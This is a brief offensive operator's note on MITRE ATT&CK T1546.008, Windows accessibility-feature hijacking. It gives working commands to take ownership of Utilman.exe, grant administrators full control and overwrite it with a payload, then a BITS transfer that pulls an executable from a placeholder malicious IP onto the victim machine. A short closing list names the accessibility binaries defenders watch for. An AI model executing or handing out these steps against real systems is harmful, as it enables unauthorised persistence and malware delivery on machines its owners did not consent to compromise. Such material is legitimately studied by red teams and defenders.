# [Accessibility Features](https://attack.mitre.org/techniques/T1546/008/)

## Exploit syntax:

1. Get a beacon with administrative privileges. 
1. In parrot open a blank text file and paste the following commands into it and edit the <payload path> to the payload location on the victim box
    ```sh
    takeown /f c:\windows\system32\Utilman.exe /A;
	icacls c:\windows\system32\Utilman.exe /grant administrators:F;
	move <payload path> c:\windows\system32\Utilman.exe;
    ```

2.  In posh, run
    ```sh
    sharpps start-bitstransfer -source http://<malicious ip address>:12137/Abrodolph.exe -destination <victim save location>
    ```

## Detection Technique:
* Observe common Windows Accessibility Features executables
	* sethc.exe 
	* Utilman.exe
	* osk.exe
	* Narrator.exe
	* Magnify.exe